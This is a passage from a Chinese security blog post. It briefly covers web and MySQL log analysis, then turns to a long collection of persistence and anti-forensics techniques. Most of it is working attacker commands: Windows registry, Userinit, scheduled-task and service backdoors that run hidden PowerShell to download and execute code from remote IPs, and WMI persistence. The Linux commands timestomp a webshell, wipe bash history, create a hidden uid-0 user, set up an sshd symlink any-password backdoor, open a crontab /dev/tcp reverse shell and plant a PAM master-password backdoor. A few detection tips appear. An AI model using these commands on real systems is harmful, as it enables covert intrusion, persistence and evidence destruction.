服务器接收处理请求及运行时错误等各种原始信息。通过对 WEB 日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、列出当天访问次数最多的IP命令：</span><br><span class=\"line\">cut -d- -f 1 log_file|uniq -c | sort -rn | head -20</span><br><span class=\"line\"></span><br><span class=\"line\">2、查看当天有多少个IP访问：</span><br><span class=\"line\">awk &#x27;&#123;print $1&#125;&#x27; log_file|sort|uniq|wc -l</span><br><span class=\"line\"></span><br><span class=\"line\">3、查看某一个页面被访问的次数：</span><br><span class=\"line\">grep &quot;/index.php&quot; log_file | wc -l</span><br><span class=\"line\"></span><br><span class=\"line\">4、查看每一个IP访问了多少个页面：</span><br><span class=\"line\">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27; log_file</span><br><span class=\"line\"></span><br><span class=\"line\">5、将每个IP访问的页面数进行从小到大排序：</span><br><span class=\"line\">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#x27; log_file | sort -n</span><br><span class=\"line\"></span><br><span class=\"line\">6、查看某一个IP访问了哪些页面：</span><br><span class=\"line\">grep ^111.111.111.111 log_file| awk &#x27;&#123;print $1,$7&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">7、去掉搜索引擎统计当天的页面：</span><br><span class=\"line\">awk &#x27;&#123;print $12,$1&#125;&#x27; log_file | grep ^\\&quot;Mozilla | awk &#x27;&#123;print $2&#125;&#x27; |sort | uniq | wc -l</span><br><span class=\"line\"></span><br><span class=\"line\">8、查看2018年6月21日14时这一个小时内有多少IP访问:</span><br><span class=\"line\">awk &#x27;&#123;print $4,$1&#125;&#x27; log_file | grep 21/Jun/2018:14 | awk &#x27;&#123;print $2&#125;&#x27;| sort | uniq | wc -l\t</span><br></pre></td></tr></table></figure>\n<p>日志分析过程</p>\n<p>1、定位攻击源</p>\n<p>2、搜索相关日志记录</p>\n<p>3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p>\n<p>4. 加固攻击者访问的网站</p>\n<h3 id=\"mysql日志分析\"><a class=\"markdownIt-Anchor\" href=\"#mysql日志分析\">#</a> mysql 日志分析</h3>\n<p>设置日志</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、查看log配置信息</span><br><span class=\"line\">show variables like &#x27;%general%&#x27;;</span><br><span class=\"line\">2、开启日志</span><br><span class=\"line\">SET GLOBAL general_log = &#x27;On&#x27;;</span><br><span class=\"line\">3、指定日志文件路径</span><br><span class=\"line\">#SET GLOBAL general_log_file = &#x27;/var/lib/mysql/mysql.log&#x27;;</span><br></pre></td></tr></table></figure>\n<p>主要需要注意爆破 root 密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#有哪些IP在爆破</span><br><span class=\"line\">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&#x27;&quot; -f4|uniq -c|sort -nr</span><br><span class=\"line\">     27 192.168.204.1</span><br><span class=\"line\"></span><br><span class=\"line\">#爆破用户名字典都有哪些</span><br><span class=\"line\">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&#x27;&quot; -f2|uniq -c|sort -nr</span><br><span class=\"line\">     13 mysql</span><br><span class=\"line\">     12 root</span><br><span class=\"line\">      1 root</span><br><span class=\"line\">      1 mysql</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>如果爆破密码，失败的时候会显示 &quot;Access denied&quot;，可靠此进行分析</p>\n<h2 id=\"权限维持\"><a class=\"markdownIt-Anchor\" href=\"#权限维持\">#</a> 权限维持</h2>\n<h3 id=\"windows-2\"><a class=\"markdownIt-Anchor\" href=\"#windows-2\">#</a> Windows</h3>\n<h4 id=\"0x01-注册表自启动\"><a class=\"markdownIt-Anchor\" href=\"#0x01-注册表自启动\">#</a> 0x01 注册表自启动</h4>\n<p>通过修改注册表自启动键值，添加一个木马程序路径，实现开机自启动。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Run键 </span><br><span class=\"line\">HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</span><br><span class=\"line\"></span><br><span class=\"line\"># Winlogon\\Userinit键</span><br><span class=\"line\">HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon</span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon</span><br><span class=\"line\"></span><br><span class=\"line\">类似的还有很多,关键词：注册表启动键值。</span><br></pre></td></tr></table></figure>\n<p><strong>不落地的后门通过 cs 的 web 投递生成</strong></p>\n<p>使用以下命令可以一键实现无文件注册表后门：不落地</p>\n<p><code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring('http://192.168.174.131/a'))\\&quot;&quot; /f</code></p>\n<p><strong>Logon Scripts 后门</strong></p>\n<p>注册表路径：HKEY_CURRENT_USER\\Environment\\</p>\n<p>创建字符串键值：  UserInitMprLogonScript，键值设置为 bat 的绝对路径： <code>c:\\test.bat</code></p>\n<p><strong>userinit 后门</strong></p>\n<p>在用户进行登陆时，winlogon 运行指定的程序。根据官方文档，可以更改它的值来添加与删除程序。</p>\n<p>利用 USERINIT 注册表键实现无文件后门：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]</span><br><span class=\"line\"> </span><br><span class=\"line\">&quot;Userinit&quot;=&quot;C:\\\\Windows\\\\system32\\\\userinit.exe,C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.142:8888/logo.gif&#x27;))\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x02-组策略设置脚本启动\"><a class=\"markdownIt-Anchor\" href=\"#0x02-组策略设置脚本启动\">#</a> 0x02 组策略设置脚本启动</h4>\n<p>运行 gpedit.msc 进入本地组策略，通过 Windows 设置的 “脚本 (启动 / 关机)” 项来说实现。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109181141835.png\" alt=\"image-20221109181141835\"></p>\n<p>脚本名写 powershell 绝对路径，脚本参数写 web 投递后门</p>\n<h4 id=\"0x03-计划任务\"><a class=\"markdownIt-Anchor\" href=\"#0x03-计划任务\">#</a> 0x03 计划任务</h4>\n<p>通过 window 系统的任务计划程序功能实现定时启动某个任务，执行某个脚本。</p>\n<p>使用以下命令可以一键实现：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /create /sc minute /mo 1 /tn &quot;Security Script&quot; /tr &quot;powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(\\&quot;\\&quot;\\&quot;http://192.168.3.48:8080/T5uEhVubWqF\\&quot;\\&quot;\\&quot;))\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<p>容易遇到的问题：cmd 命令行执行单引号会被替换成双引号，故这里使用三个双引号替代。</p>\n<p>合理的日期：某月某月凌晨三点</p>\n<h4 id=\"0x04-服务自启动\"><a class=\"markdownIt-Anchor\" href=\"#0x04-服务自启动\">#</a> 0x04 服务自启动</h4>\n<p>通过服务设置自启动，结合 powershell 实现无文件后门。</p>\n<p>使用以下命令可实现：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc create &quot;KeyName&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.3.48:8080/T5uEhVubWqF&#x27;))\\&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">sc description  KeyName &quot;Just For Test&quot;   //设置服务的描述字符串</span><br><span class=\"line\">sc config Name start= auto                //设置这个服务为自动启动</span><br><span class=\"line\">net start Name                            //启动服务</span><br></pre></td></tr></table></figure>\n<p>成功创建了一个自启动服务</p>\n<p><strong>通过服务自启动上线权限为 system</strong></p>\n<h4 id=\"0x05-wmi后门\"><a class=\"markdownIt-Anchor\" href=\"#0x05-wmi后门\">#</a> 0x05 WMI 后门</h4>\n<p>在 2015 年的 blackhat 大会上 Matt Graeber 介绍了一种无文件后门就是用的 WMI。这里可以利用一个工具 powersploit，下面用它的 Persistence 模块来示范一个简单的例子。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Import-Module .\\Persistence\\Persistence.psm1</span><br><span class=\"line\">$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At &#x27;3 PM&#x27;</span><br><span class=\"line\">$UserOptions = New-UserPersistenceOption -Registry -AtLogon</span><br><span class=\"line\">Add-Persistence -FilePath .\\web.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose</span><br></pre></td></tr></table></figure>\n<h3 id=\"linux-2\"><a class=\"markdownIt-Anchor\" href=\"#linux-2\">#</a> linux</h3>\n<h4 id=\"0x00隐藏文件\"><a class=\"markdownIt-Anchor\" href=\"#0x00隐藏文件\">#</a> 0x00 隐藏文件</h4>\n<p>Linux 下创建一个隐藏文件： <code>touch  .test.txt</code></p>\n<h4 id=\"0x01隐藏文件时间戳\"><a class=\"markdownIt-Anchor\" href=\"#0x01隐藏文件时间戳\">#</a> 0x01 隐藏文件时间戳</h4>\n<p>Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。</p>\n<p>比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。</p>\n<p>touch -r index.php webshell.php</p>\n<p>或者直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。</p>\n<p>touch -t 1401021042.30 webshell.php</p>\n<h4 id=\"0x03-隐藏权限\"><a class=\"markdownIt-Anchor\" href=\"#0x03-隐藏权限\">#</a> 0x03 隐藏权限</h4>\n<p>在 Linux 中，使用 chattr 命令来防止 root 和其他管理用户误删除和修改重要文件及目录，此权限用 ls -l 是查看不出来的，从而达到隐藏权限的目的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chattr +i evil.php 锁定文件</span><br><span class=\"line\">lsattr  evil.php   属性查看</span><br><span class=\"line\">chattr -i evil.php 解除锁定</span><br><span class=\"line\">rm -rf 1.evil.php  删除文件</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x04隐藏历史命令\"><a class=\"markdownIt-Anchor\" href=\"#0x04隐藏历史命令\">#</a> 0x04 隐藏历史命令</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[space]set +o history</span><br><span class=\"line\">备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span><br></pre></td></tr></table></figure>\n<p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">history -d [num]</span><br></pre></td></tr></table></figure>\n<p>这种技巧是关键记录删除，或者我们可以暴力点，比如前 150 行是用户的正常操作记录，150 以后是攻击者操作记录。我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前 150 行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sed -i &#x27;150,$d&#x27; .bash_history</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x05隐藏ssh\"><a class=\"markdownIt-Anchor\" href=\"#0x05隐藏ssh\">#</a> 0x05 隐藏 ssh</h4>\n<p>#隐身登录系统，不会被 w、who、last 等指令检测到。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -T root@127.0.0.1 /bin/bash -i</span><br></pre></td></tr></table></figure>\n<p>这是因为 w 命令显示信息来源于 utmp，last 来源于 wtmp，并不是所有程序登录的时候都会调用 utmp 和 wtmp 日志记录接口，只有交互式会话，才会调用 utmp 和 wtmp 的日志记录接口，比如通过 tty 或者 pts 或者图形界面登录的都会调用 utmp 和 wtmp 日志记录接口，然后我们在使用 w 和 last 命令的时候就会发现登录信息</p>\n<p>不记录 ssh 公钥在本地.ssh 目录中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</span><br><span class=\"line\">-T 表示不分配伪终端 （正常的会话，在分配伪终端之后才会调用utmp和wtmp的日志接口）</span><br><span class=\"line\">/usr/bin/bash -i  表示在登录之后 调用bash命令</span><br><span class=\"line\">-i 表示是交互式shell</span><br></pre></td></tr></table></figure>\n<p>ssh -lroot 192.168.12.51/usr/bin/bash 其实就相当于登录之后直接调用 bash 这个名，此时系统没有为其分配 tty，不算一个完整交互式会话，只不过 bash 接受输入，然后有输出，让我们误以为是交互式会话，其实不然，你可以将 /usr/bin/bash 替换成 /usr/bin/ls 试一下，就是简单执行以下就退出了</p>\n<p>通过 ps -ef  和 lsof -i:22  仍然可以看到</p>\n<p>如果已经退出，那么可以到 secure 日志中找</p>\n<h4 id=\"0x06端口复用\"><a class=\"markdownIt-Anchor\" href=\"#0x06端口复用\">#</a> 0x06 端口复用</h4>\n<p>第二种方式：利用 IPTables 进行端口复用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 端口复用链</span><br><span class=\"line\">iptables -t nat -N LETMEIN</span><br><span class=\"line\"># 端口复用规则</span><br><span class=\"line\">iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22</span><br><span class=\"line\"># 开启开关</span><br><span class=\"line\">iptables -A INPUT -p tcp -m string --string &#x27;threathuntercoming&#x27; --algo bm -m recent --set --name letmein --rsource -j ACCEPT</span><br><span class=\"line\"># 关闭开关</span><br><span class=\"line\">iptables -A INPUT -p tcp -m string --string &#x27;threathunterleaving&#x27; --algo bm -m recent --name letmein --remove -j ACCEPT</span><br><span class=\"line\"># let&#x27;s do it</span><br><span class=\"line\">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#开启复用</span><br><span class=\"line\">echo threathuntercoming | socat - tcp:192.168.28.128:80</span><br><span class=\"line\">#ssh使用80端口进行登录</span><br><span class=\"line\">ssh -p 80 root@192.168.28.128</span><br><span class=\"line\">#关闭复用</span><br><span class=\"line\">echo threathunterleaving | socat - tcp:192.168.28.128:80</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x00添加用户\"><a class=\"markdownIt-Anchor\" href=\"#0x00添加用户\">#</a> 0x00 添加用户</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 创建一个用户名guest，密码123456的root用户</span><br><span class=\"line\">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure>\n<p>排查</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 查询特权用户特权用户(uid 为0)</span><br><span class=\"line\">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class=\"line\"># 查询可以远程登录的帐号信息</span><br><span class=\"line\">[root@localhost ~]# awk &#x27;/\\$1|\\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class=\"line\"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class=\"line\">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x01suid\"><a class=\"markdownIt-Anchor\" href=\"#0x01suid\">#</a> 0x01SUID</h4>\n<p>Suid shell 是一种可用于以拥有者权限运行的 shell。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">配合普通用户权限使用</span><br><span class=\"line\">cp /bin/bash /tmp/shell</span><br><span class=\"line\">chmod u+s /tmp/shell</span><br><span class=\"line\"></span><br><span class=\"line\">/tmp/shell</span><br><span class=\"line\">一般将其命名为find等系统命令，存在位置为/usr/bin</span><br></pre></td></tr></table></figure>\n<p>排查技巧：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 在Linux中查找SUID设置的文件</span><br><span class=\"line\">find . -perm /4000 </span><br><span class=\"line\"># 在Linux中查找使用SGID设置的文件</span><br><span class=\"line\">find . -perm /2000</span><br><span class=\"line\"># 取消s权限</span><br><span class=\"line\">chmod u-s /tmp/shell</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x02-ssh免密登录\"><a class=\"markdownIt-Anchor\" href=\"#0x02-ssh免密登录\">#</a> 0x02 ssh 免密登录</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa\t</span><br></pre></td></tr></table></figure>\n<p>再将公钥复制到.ssh 中 <code>/root/.ssh/authorized_keys</code></p>\n<h4 id=\"0x03-软连接\"><a class=\"markdownIt-Anchor\" href=\"#0x03-软连接\">#</a> 0x03 软连接</h4>\n<p>在 sshd 服务配置运行 PAM 认证的前提下，PAM 配置文件中控制标志为 sufficient 时只要 pam_rootok 模块检测 uid 为 0 即 root 权限即可成功认证登陆。通过软连接的方式，实质上 PAM 认证是通过软连接的文件名  <code>/tmp/su</code>  在 <code>/etc/pam.d/</code>  目录下寻找对应的 PAM 配置文件 (如: /etc/pam.d/su)，任意密码登陆的核心是 <code>auth sufficient pam_rootok.so</code> ，所以只要 PAM 配置文件中包含此配置即可 SSH 任意密码登陆，除了 su 中之外还有 chsh、chfn 同样可以。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888</span><br></pre></td></tr></table></figure>\n<p>执行完之后，任何一台机器 <code>ssh root@IP -p 8888</code> ，输入任意密码，成功登录。</p>\n<p>排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。</p>\n<h4 id=\"0x04crontab反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#0x04crontab反弹shell\">#</a> 0x04crontab 反弹 shell</h4>\n<p>crontab 命令用于设置周期性被执行的指令。新建 shell 脚本，利用脚本进行反弹。</p>\n<p>a、创建 shell 脚本，例如在 /etc/evil.sh</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345  0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p><code>chmod +sx /etc/evil.sh</code></p>\n<p>b、crontab -e 设置定时任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#每一分钟执行一次</span><br><span class=\"line\">*/1 * * * * root /etc/evil.sh</span><br></pre></td></tr></table></figure>\n<p>重启 crond 服务， <code>service crond restart</code> ，然后就可以用 nc 接收 shell。</p>\n<h4 id=\"0x05pam后门\"><a class=\"markdownIt-Anchor\" href=\"#0x05pam后门\">#</a> 0x05pam 后门</h4>\n<p>PAM （Pluggable Authentication Modules ）是由 Sun 提出的一种认证机制。它通过提供一些动态链接库和一套统一的 API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM 最初是集成在 Solaris 中，目前已移植到其它系统中，如 Linux、SunOS、HP-UX 9.0 等。</p>\n<p>利用方法:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、获取目标系统所使用的PAM版本，下载对应版本的pam版本</span><br><span class=\"line\">2、解压缩，修改pam_unix_auth.c文件，添加万能密码</span><br><span class=\"line\">3、编译安装PAM</span><br><span class=\"line\">4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。</span><br></pre></td></tr></table></figure>\n<p>排查</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 1、通过Strace跟踪ssh</span><br><span class=\"line\">ps axu | grep sshd</span><br><span class=\"line\">strace -o aa -ff -p PID</span><br><span class=\"line\">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class=\"line\"># 2、检查pam_unix.so的修改时间</span><br><span class=\"line\">stat /lib/security/pam_unix.so      #32位</span><br><span class=\"line\">stat /lib64/security/pam_unix.so    #64位</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        }
    ]
}